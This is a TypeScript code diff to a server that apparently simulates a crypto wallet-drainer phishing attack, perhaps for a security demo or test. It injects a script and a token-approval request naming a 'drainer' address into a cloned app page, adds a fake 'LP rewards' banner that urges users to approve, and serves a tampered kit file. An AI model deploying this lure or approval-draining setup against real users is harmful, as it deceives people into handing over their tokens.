@@ -4,6 +4,7 @@ import { fileURLToPath } from 'node:url';
 import type { Address } from 'viem';
 import { envPort, json, serve } from './http';
 import { hijackRequest } from './hijack-request';
+import { withControl } from './site';
 
 const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..');
 
@@ -15,11 +16,15 @@ export function tamperKit(html: Buffer): Buffer {
   return Buffer.from(s.replace('<title>Copeybara exit kit</title>', '<title>Copeybara exit klt</title>'), 'utf8');
 }
 
-export function startHijack(opts: { port?: number; kitFile: string; token: Address; drainer?: Address }) {
-  const page = readFileSync(join(ROOT, 'site', 'index.html'), 'utf8').replace(
+export function startHijack(opts: { port?: number; kitFile: string; token: Address; drainer?: Address; controlUrl?: string }) {
+  const page = withControl(readFileSync(join(ROOT, 'site', 'index.html'), 'utf8'), opts.controlUrl).replace(
     '<script src="/app.js"></script>',
     `<script src="/app.js"></script>\n  <script>window.__HIJACK_REQUEST__=${JSON.stringify(hijackRequest(opts.token, opts.drainer))}</script>\n  <script src="/inject.js"></script>`,
-  ).replace('<!--LURE-->', '<div class="lure">🎁 Your LP rewards are ready. <b>Approve to view your rewards</b>, then click Connect wallet.</div>');
+  ).replace(
+    '<!--LURE-->',
+    // the attacker's only visible change: a "rewards" banner styled like the rest of the app
+    '<div class="lure"><svg class="i" viewBox="0 0 24 24"><rect x="3" y="8" width="18" height="4" rx="1"/><path d="M12 8v13M5 12v9h14v-9M7.5 8a2.5 2.5 0 0 1 0-5C10 3 12 8 12 8s2-5 4.5-5a2.5 2.5 0 0 1 0 5"/></svg><span>Your LP rewards are ready. <b>Approve to view your rewards</b>, then click Connect wallet.</span></div>',
+  );
   const tampered = tamperKit(readFileSync(opts.kitFile));
   return serve(opts.port ?? envPort('HIJACK_PORT', 8082), (req, res) => {
     const path = (req.url ?? '/').split('?')[0];
